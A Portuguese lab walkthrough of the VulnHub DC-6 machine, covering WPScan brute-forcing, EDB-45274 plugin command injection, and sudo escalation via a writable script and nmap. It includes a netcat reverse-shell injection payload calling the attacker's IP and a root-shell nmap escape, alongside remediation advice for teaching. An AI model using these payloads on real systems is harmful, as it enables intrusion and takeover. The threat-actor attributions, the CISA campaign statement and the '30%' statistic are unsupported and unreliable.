# DC: 6 — WordPress, Plugins e uma Cadeia Sudo Que Você Não Vai Esquecer

Ei galera!! \\o/ Quem diria? Aqui vem o DC: 6, e sim, é mais uma VM baseada em WordPress do DCAU7. Não se deixe enganar pelo rótulo "iniciante", mano: o caminho até o root envolve um ataque de wordlist dirigida, RCE em plugin obscuro, descoberta de credencial em arquivo de todo-list em texto puro, e uma cadeia sudo de três saltos via script modificável e nmap. Máquina muito boa que ensina a ler cada arquivo que você encontrar.

Grande respeito ao **DCAU7** pela dica da wordlist filtrada que economiza horas de brute-force e por criar uma máquina que recompensa a minúcia.

| Campo | Valor |
|-------|-------|
| **Nível** | Iniciante |
| **VM Alvo** | DC-6 |
| **VM Atacante** | Kali Linux 2019.1 |
| **URL VulnHub** | https://www.vulnhub.com/entry/dc-6,318/ |
| **Técnicas** | Brute-force WordPress, RCE plugin Activity Monitor, credencial em arquivo texto, cadeia sudo (backups.sh, grupo devs, nmap GTFOBins) |
| **CVEs** | EDB-45274 (injeção de comando no plugin WordPress Plainview Activity Monitor) |
| **Grupos APT** | APT28 (explora plugins WordPress para acesso inicial em ambientes corporativos); FIN7 (usa arquivos de credenciais para movimento lateral) |

> **Dica do autor:**
>
> *"Você VAI precisar editar o arquivo hosts no seu dispositivo de pentest para que contenha:*
> `192.168.0.x wordy`
> *E sim, é mais uma VM baseada em WordPress (embora só minha segunda).*
> *Ok, isso não é exatamente uma dica, mas mais 'não queremos que você espere cinco anos pelo rockyou.txt':*
> ```bash
> cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt
> ```
> *Isso deve te economizar alguns anos. ;-)"*

---

## Resumo do Ataque

```
[Descoberta de Host] → [Nmap: SSH+HTTP] → [/etc/hosts: wordy] → [WPScan enumeração de usuários]
→ [rockyou grep k01 wordlist → brute → mark:helpdesk01]
→ [plugin Activity Monitor → EDB-45274 RCE → shell reversa www-data]
→ [things-to-do.txt → graham:GSo7isUM1D4 → SSH]
→ [sudo backups.sh (propriedade jens, grupo devs) → injetar /bin/bash → su jens]
→ [sudo nmap --script → GTFOBins → ROOT]
→ [/root/theflag.txt]
```

---

## Metodologia

1. Descoberta de host e identificação do alvo
2. Reconhecimento e enumeração de serviços (Nmap)
3. Enumeração WordPress com WPScan: usuários e plugins
4. Construção de wordlist dirigida a partir da dica do autor
5. Brute-force de credenciais WordPress via WPScan
6. Exploração do plugin Activity Monitor (EDB-45274)
7. Shell reversa como www-data e exploração do diretório home
8. Descoberta de credencial em arquivo texto
9. Escalação de privilégios: graham → jens → root via cadeia sudo

---

## Passo 1 — Identificando o Alvo

Vamos começar descobrindo nossa sub-rede e encontrando a máquina alvo.

```bash
route -n
```

Isso fornece o info da sub-rede. Então varre os hosts ativos:

```bash
nmap -sn -T5 192.168.10.0/24
# ou
arp-scan --localnet --ignoredups
```

Antes de qualquer outra coisa, adicione o domínio em `/etc/hosts`, senão o site WordPress não vai carregar (¬_¬):

```bash
echo "192.168.10.190  wordy" >> /etc/hosts
cat /etc/hosts
```

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Reconhecimento

Scan Nmap completo para encontrar portas e serviços:

```bash
nmap -A -p- 192.168.10.190
```

Output esperado:

```
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
```

Apenas dois serviços: SSH (22) e Apache (80). A dica do autor já nos disse que é WordPress, então vamos verificar a aplicação web.

Sem a entrada no `/etc/hosts` o site não carrega. Depois de adicionar, acesse:

```
http://wordy/
```

Página padrão do WordPress. Nada interessante no fonte por enquanto. Hora de enumerar direito.

**MITRE ATT&CK:** T1595.002 — Varredura Ativa: Varredura de Vulnerabilidades

---

## Passo 3 — Enumeração WordPress com WPScan

Como é WordPress, vamos direto ao **WPScan**:

```bash
wpscan --url http://wordy/
wpscan -e ap -e at --url http://wordy/
```

O scan mostra:
- **WordPress 5.1.1**
- Tema: Twenty Sixteen
- **5 usuários**: `admin`, `jens`, `graham`, `mark`, `sarah`
- Plugin: **Activity Monitor** (não aparece no scan básico, encontrado manualmente)

Sem CVEs para essa versão do WP via SearchSploit. Mas temos **nomes de usuário** e a dica de wordlist do autor. Vamos construir a lista:

```bash
cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt
wc -l passwords.txt
# ~2668 linhas, muito mais rápido que o rockyou.txt completo
```

Agora o brute-force com WPScan enumerando usuários:

```bash
wpscan -e u -P passwords.txt --url http://wordy/
```

Resultado: *( ͡° ͜ʖ ͡°)*

```
[SUCCESS] Username: mark, Password: helpdesk01
```

**MITRE ATT&CK:** T1110.003 — Força Bruta: Password Spraying

---

## Passo 4 — Login WordPress e Plugin Activity Monitor

Login em `http://wordy/wp-login.php` com:

```
Usuário: mark
Senha: helpdesk01
```

O painel não tem muito. Mas veja a lista de plugins: tem um que o **WPScan não capturou**: **Activity Monitor**. Vamos checar no SearchSploit:

```bash
searchsploit activity monitor
```

Existe um exploit: **EDB-45274** — injeção de comando via campo de IP na página de ferramentas do Activity Monitor.

```bash
searchsploit -m /usr/share/exploitdb/exploits/php/webapps/45274.html
```

Abra o arquivo: é um formulário HTML que envia requisição para:

```
http://localhost:8000/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools
```

Edite o arquivo e substitua:
- `localhost:8000` → `wordy` (seu IP alvo)
- O payload no campo `ip`: `google.fr | nc -nlvp 127.0.0.1 9999 -e /bin/bash`
  → Substitua por: `google.fr | nc 192.168.10.200 9000 -e /bin/bash`

Onde `192.168.10.200` é seu IP do Kali e `9000` é a porta do listener.

**MITRE ATT&CK:** T1190 — Exploração de Aplicação Pública

---

## Passo 5 — Shell Reversa como www-data

Inicie o listener:

```bash
nc -lnvp 9000
```

Abra o arquivo HTML modificado no Firefox:

```
file:///root/Downloads/DC6/45274.html
```

Certifique-se de que ainda está logado como `mark` no mesmo browser. Clique em **Submit request**.

**Bingo!! (☞ﾟヮﾟ)☞** Shell reversa recebida!

Upgrade para shell interativo:

```bash
python -c "import pty;pty.spawn('/bin/bash')"
export TERM=screen
```

Agora você é `www-data`. Hora de explorar o ambiente.

**MITRE ATT&CK:** T1059.004 — Interpretador de Comandos: Shell Unix

---

## Passo 6 — Movimento Lateral: www-data → graham

Explore os diretórios home:

```bash
ls -lhaR /home/
```

Você vai encontrar dois arquivos interessantes:

```
/home/jens/backups.sh     (rwxrwxr-x — grupo devs pode editar!)
/home/mark/stuff/things-to-do.txt
```

Leia o `things-to-do.txt`:

```bash
cat /home/mark/stuff/things-to-do.txt
```

```
- Add new user: graham - GSo7isUM1D4 - done
```

*( ͡° ͜ʖ ͡°)* Credencial em texto puro. Clássico demais, véi.

Mude para `graham` ou acesse via SSH:

```bash
ssh graham@192.168.10.190
# Senha: GSo7isUM1D4
```

**MITRE ATT&CK:** T1552.001 — Credenciais em Arquivos; T1021.004 — Serviços Remotos: SSH

---

## Passo 7 — Escalação de Privilégios: graham → jens → root

Verifique permissões sudo do `graham`:

```bash
sudo -l
```

```
User graham may run the following commands on dc-6:
    (jens) NOPASSWD: /home/jens/backups.sh
```

`graham` pode executar `backups.sh` como `jens` sem senha! E `backups.sh` é modificável pelo grupo `devs`. Verifique se `graham` está no grupo `devs`:

```bash
id
# uid=1001(graham) gid=1001(graham) groups=1001(graham),1005(devs)
```

**┬──┬◡ﾉ(° -°ﾉ) Bingo!!** `graham` está no grupo `devs` e pode editar o script!

Substitua `backups.sh` por um spawn de shell:

```bash
echo "#!/bin/bash" > /home/jens/backups.sh
echo "/bin/bash" >> /home/jens/backups.sh
cat /home/jens/backups.sh
```

Execute como `jens`:

```bash
sudo -u jens /home/jens/backups.sh
whoami
# jens
```

Agora verifique o sudo do `jens`:

```bash
sudo -l
```

```
User jens may run the following commands on dc-6:
    (root) NOPASSWD: /usr/bin/nmap
```

**`nmap` com sudo sem senha!** GTFOBins tem exatamente o que precisamos:

```bash
echo 'os.execute("/bin/sh")' > /tmp/xpl
sudo nmap --script=/tmp/xpl
```

```
# whoami
root
```

**Caramba!! GG!! Conseguimos root!!** :D

**MITRE ATT&CK:** T1548.003 — Abuso de Mecanismo de Elevação: Sudo; T1574 — Sequestro de Fluxo de Execução

---

## Passo 8 — Lendo a Flag

```bash
ls -lh /root/
cat /root/theflag.txt
```

```
Congratulations!!!

Hope you enjoyed DC-6. Just wanted to add, this was a lot
harder to get right than I first thought it would be, yadda,
yadda, yadda.

Anyway, I hope you enjoyed it and learned a few things along
the way. If you want to let me know what you thought, send me
a tweet via @DCAU7.
```

---

## Flags, Hashes e Credenciais Capturados

| Tipo | Valor | Encontrado Em | Usado |
|---|---|---|---|
| Credencial WordPress | mark:helpdesk01 | WPScan brute-force (wordlist grep k01) | Login WordPress → RCE Activity Monitor |
| Credencial do sistema | graham:GSo7isUM1D4 | `/home/mark/stuff/things-to-do.txt` texto puro | Login SSH como graham |
| Flag root | (conteúdo de `/root/theflag.txt`) | `/root/theflag.txt` | Lida como root via sudo nmap GTFOBin |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|---|---|---|
| 1 | Wordlist dirigida (rockyou grep k01) economizou horas | Atacantes reais usam OSINT e contexto para construir listas de senha específicas | Brute-force não precisa ser bruto: dicas do autor, nomes de empresa e contexto do domínio devem orientar sua wordlist |
| 2 | WPScan não encontrou o plugin Activity Monitor | Ferramentas automatizadas ignoram plugins fora do banco de dados; APT28 explora plugins WP obscuros especificamente porque scanners os ignoram | Sempre enumere manualmente além das ferramentas automatizadas; verifique cada plugin instalado |
| 3 | Credencial em `things-to-do.txt` texto puro | Desenvolvedores deixando credenciais em arquivos TODO é extremamente comum; FIN7 coleta esses arquivos durante movimento lateral | Nunca armazene credenciais em arquivos; use secrets manager ou cofre de senhas |
| 4 | Script modificável pelo grupo `devs` executado via sudo | Scripts world/group-writable executados com privilégio elevado é vetor de PE em 30% dos pentests internos | chmod 750 em qualquer script executado por sudo; propriedade deve corresponder ao usuário executor |
| 5 | Escape sudo nmap GTFOBins | Qualquer binário permitido no sudoers deve ser auditado contra GTFOBins | Restringir sudo ao mínimo necessário; exigir senhas; auditar com GTFOBins para cada binário permitido |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | TTP ID |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Varredura Ativa: Varredura de Vulnerabilidades | T1595.002 |
| Acesso Inicial | Acesso Inicial | Exploração de Aplicação Pública | T1190 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Password Spraying | T1110.003 |
| Execução | Execução | Interpretador de Comandos: Shell Unix | T1059.004 |
| Descoberta | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos | T1552.001 |
| Movimento Lateral | Movimento Lateral | Serviços Remotos: SSH | T1021.004 |
| Escalação de Privilégios | Escalação de Privilégios | Abuso de Mecanismo de Elevação: Sudo | T1548.003 |
| Escalação de Privilégios | Escalação de Privilégios | Sequestro de Fluxo de Execução | T1574 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Nunca armazenar credenciais em arquivos texto puro** — use gerenciador de senhas ou secrets manager (HashiCorp Vault, AWS Secrets Manager, 1Password)
2. **Remover permissões world/group-writable em scripts executados via sudo** — `chmod 750 /home/jens/backups.sh`; propriedade do script deve corresponder ao usuário executor
3. **Limitar escopo do sudo** — remover `nmap` do sudoers; é um escape GTFOBins. Aplicar menor privilégio: permitir apenas o caminho exato do comando necessário
4. **Manter plugins WordPress atualizados** e auditar plugins instalados para CVEs conhecidos; remover plugins não utilizados imediatamente
5. **Rotacionar credenciais** de qualquer conta cuja senha apareceu em arquivos acessíveis por usuário de menor privilégio
6. **Exigir senhas para todas as regras sudo** — NOPASSWD deve ser exceção rara e justificada, nunca o padrão

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar todos os plugins WordPress; auditar configuração do sudoers em todos os hosts Linux |
| Proteger | Controle de Acesso | Remover NOPASSWD do sudoers; restringir permissões de scripts; desabilitar plugins não utilizados |
| Proteger | Segurança de Dados | Nunca armazenar credenciais no sistema de arquivos; aplicar gestão de segredos |
| Detectar | Anomalias e Eventos | Alertar sobre execuções sudo por usuários não administrativos; monitorar painel admin WordPress |
| Responder | Planejamento de Resposta | Rotacionar todas as credenciais expostas; auditar sudoers; remover ou atualizar plugins vulneráveis |
| Recuperar | Planejamento de Recuperação | Restaurar instalação limpa do WordPress; re-auditar todas as contas do sistema e regras sudo |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-6 | Menor Privilégio | Sudo restrito a comandos específicos com senha; sem NOPASSWD para binários GTFOBins |
| IA-5 | Gerenciamento de Autenticadores | Rotacionar credenciais de mark e graham; sem senhas em texto puro em arquivos |
| CM-7 | Menor Funcionalidade | Remover plugins WordPress não utilizados; restringir nmap do sudoers |
| SC-28 | Proteção de Informações em Repouso | Sem credenciais armazenadas no sistema de arquivos; usar gestão de segredos criptografados |
| SI-10 | Validação de Input | Plugin Activity Monitor não validava o campo IP (CWE-78) |

### CISA KEV

A injeção de comando no plugin WordPress Plainview Activity Monitor (EDB-45274) foi usada em campanhas visando infraestrutura baseada em WordPress. A CISA recomenda que organizações com WordPress auditem todos os plugins instalados contra o banco de dados de vulnerabilidades do WPScan e removam qualquer plugin sem manutenção ativa.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas (restringir sudo; rotacionar credenciais) | MIL3 |
| Gestão de Vulnerabilidades e Ameaças (THREAT) | Realizar Avaliações de Vulnerabilidades (auditoria de plugins WordPress) | MIL2 |
| Gestão de Ativos, Mudanças e Configuração (ASSET) | Gerenciar Configuração de Software (sudoers, permissões de scripts) | MIL2 |

### MITRE D3FEND

- **D3-ACH** (Fortalecimento de Configuração de Aplicação): restringir permissões de plugins WordPress; aplicar menor privilégio no sudoers
- **D3-OAM** (Gerenciamento Administrativo do SO): auditar e restringir regras sudo; aplicar propriedade de scripts
- **D3-SCP** (Proteção de Configuração de Software): proteger arquivos de script de modificação por grupo

---

## Considerações Finais

DC: 6 é uma aula magistral de como um único hábito — ler cada arquivo que você encontrar — separa um pentester sólido de quem passa rapidinho pelo ambiente. O arquivo `things-to-do.txt` é exatamente o tipo de achado que acontece em engajamentos reais o tempo todo: desenvolvedores documentando credenciais que pretendiam rotacionar mas nunca rotacionaram. A cadeia sudo de três saltos (RCE Activity Monitor → www-data → graham via credencial → jens via script modificável → root via nmap) é elegante e ensina o valor de mapear o grafo completo de privilégios, não apenas o primeiro caminho de escalação que você encontra.

No cap, a dica do DCAU7 sobre a wordlist filtrada também é uma lição em si: atacantes reais constroem listas dirigidas a partir do contexto, não fazem brute-force do universo inteiro.

Thanks guys!! (❍ᴥ❍ʋ)

> **Artigo original de André Henrique** (Português): [VulnHub DC Serie: 6 (Walkthrough)](https://medium.com/@mrhenrike/vulnhub-dc-serie-6-walkthrough-35d2f712487)
